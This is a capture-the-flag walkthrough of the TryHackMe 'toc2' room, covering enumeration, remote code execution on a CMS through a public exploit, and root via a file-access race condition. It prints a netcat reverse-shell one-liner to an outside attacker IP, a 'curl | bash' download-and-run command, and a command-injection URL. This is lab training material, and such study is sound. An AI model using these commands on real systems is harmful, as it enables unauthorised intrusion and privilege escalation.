# 55 - toc2 (race condition exploitation)

Room Link --> [https://tryhackme.com/dashboard](https://tryhackme.com/dashboard)

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
┌──(dking㉿dking)-[~/Downloads]
└─$ nmap -Pn -n -v 10.10.136.233 -p- -T5

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```
{% endcode %}

On the website main page, there is a note:

<figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

`cmsmsuser:devpass`  - the dev left his credentials there.

The `robots.txt` page.

<figure><img src=".gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Searched online for an exploit and got [this](https://www.exploit-db.com/exploits/44192)

#### Exploitation

Proceed as stated in the exploit POC, when we get to step 4, we intercept the traffic with burpsuite and modify the `timezone` parameter.

The dbmane is also on the `robots.txt` page.

<figure><img src=".gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

And done, we goto the path:

`http://10.10.136.233/cmsms/config.php?cmd=id;uname` - we have RCE.



<figure><img src=".gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Initial Access

Getting reverse shell, i used

‘rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.88.214 9000 >/tmp/f’, save it in a \`shell.sh\` file, then \`curl [http://10.18.88.214/shell.sh](http://10.18.88.214/shell.sh) | bash\` on the cmd paprameter.

<figure><img src=".gitbook/assets/image (385).png" alt=""><figcaption></figcaption></figure>

### Priv Esc to Frank

There is a `new_machine.txt` file in Frank home directory. It contained a password, so i tried it for Frank and it worked.

### Priv Esc to Root

There is a `readcreds.c` file that seems to be vulnerable to `Race Condition` attack.

{% code overflow="wrap" lineNumbers="true" %}
```c
frank@toc:~/root_access$ ./readcreds readcreds.c
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>

int main(int argc, char* argv[]) {
    int file_data; char buffer[256]; int size = 0;

    if(argc != 2) {
        printf("Binary to output the contents of credentials file \n ./readcreds [file] \n"); 
	exit(1);
    }

    if (!access(argv[1],R_OK)) {
	    sleep(1);
	    file_data = open(argv[1], O_RDONLY);
    } else {
	    fprintf(stderr, "Cannot open %s \n", argv[1]);
	    exit(1);
    }

    do {
        size = read(file_data, buffer, 256);
        write(1, buffer, size);
    } 
    
    while(size>0);
}
```
{% endcode %}

WATCH this video if you are not familiar with race conditions

[https://www.youtube.com/watch?v=5g137gsB9Wk](https://www.youtube.com/watch?v=5g137gsB9Wk)

Download the `rename.c`  binary used for the exploitation: https://github.com/sroettger/35c3ctf\_chals/blob/master/logrotate/exploit/rename.c

You’ll need to compile this C file first.

Create a blank file to use as one of these two arguments. I just `touch asd` , and execute it with `root_password_backup` as an argument `./rename root_password_backup asd` _._ You will see the terminal hang… this is normal.

We can now ssh as Frank in another terminal or background the process. let’s try to run the _readcreds_ binary with our file we want to read. At first we may not be able to open, but keep pounding up and enter until eventually we hit our permissions and cat the file.

<figure><img src=".gitbook/assets/image (386).png" alt=""><figcaption></figcaption></figure>

`su root`&#x20;

Done!

